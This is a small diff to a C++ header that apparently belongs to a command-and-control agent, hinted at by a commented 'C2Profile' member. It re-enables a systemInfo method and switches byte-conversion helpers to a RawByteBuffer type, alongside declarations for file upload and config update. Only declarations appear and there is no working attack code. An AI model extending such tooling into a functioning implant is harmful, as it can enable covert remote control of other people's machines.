@@ -49,7 +49,7 @@ public:
 	bool uploadFile(RawByteBuffer& data);
 	bool updateConfig(RawByteBuffer& data);
 	bool handleServerError(RawByteBuffer& data);
-	//bool systemInfo(InternalMessage& msg);
+	bool systemInfo(InternalMessage& msg);
 
 	// Processes an InternalMessage and use the messageHandler_ based on the InternalMessage's messageType
 	void processMessage(InternalMessage& msg);
@@ -63,8 +63,8 @@ public:
 
 	//bool handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg);
 private:
-	std::vector<uint8_t> string2byte(std::string& inMsg);
-	std::string byte2string(std::vector<uint8_t>& inMsg);
+	RawByteBuffer string2byte(std::string& inMsg);
+	std::string byte2string(RawByteBuffer& inMsg);
 
 	//C2Profile& config_;
 	// Connections connection_ // MessageHandler should own/control socket/connections?
